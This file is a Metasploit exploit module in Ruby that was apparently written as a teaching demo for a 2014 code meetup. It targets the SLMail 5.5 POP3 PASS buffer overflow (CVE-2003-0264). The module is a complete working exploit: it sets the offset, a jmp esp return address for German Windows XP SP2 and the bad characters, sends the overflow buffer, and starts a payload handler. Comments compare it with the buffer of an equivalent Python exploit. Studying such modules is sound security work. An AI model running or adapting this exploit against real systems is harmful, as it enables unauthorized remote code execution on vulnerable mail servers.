##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# demo metasploit exploit module for kassel codemeetup 10.09.2014
# place this exploit for metasploit under: /root/.msf4/modules/exploits/windows/misc/
# and restart metasploit or issue a "reload all"

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SLMail 5.5 Exploit Codemeetup',
      'Description'    => %q{ SLMail Exploit for Codemeetup},
      'Author'         => 'warrior',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2003-0264'],
          ['OSVDB', '11975'],
          ['BID', '7519'],
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 400,
          'BadChars' => "\x00\x0a\x0d\x20",
          'MinNops'  => 0,
	  'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows XP SP2 German, SLMail 5.5.0.04433', { 'Ret' => 0x77972ca8, 'Offset' => 2606 } ]
        ],
      'DisclosureDate' => 'May 07 2003',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(110)
      ], self.class)

  end

  def exploit
    connect

    print_status("Trying #{target.name} using jmp esp at #{"%.8x" % target.ret}")
    data = sock.get_once
    sock.put("USER TEST \r\n")
    data = sock.get_once


    # metasploit provides a lot of usefull functions for exploit modules
    # this creates the buffer that is send to the SLMail Sever

    request  = "PASS " + rand_text_alphanumeric(target['Offset']) + [target.ret].pack('V') + payload.encoded + "\r\n"

    # its the same as
    
    # request  = "PASS " + "A" * 2606 + "\xa8\x2c\x97\x77" + payload.encoded + "\r\n"

    # and for comparison the buffer from the python exploit
    
    # padding = 'A' * 2606
    # EIP = '\xa8\x2c\x97\x77'
    # nops = '\x90' * 10
    # payload = ( PLACEHOLDER )
    # buffer = padding + EIP + nops + payload
    
    sock.put(request)

    handler
    disconnect
  end

end
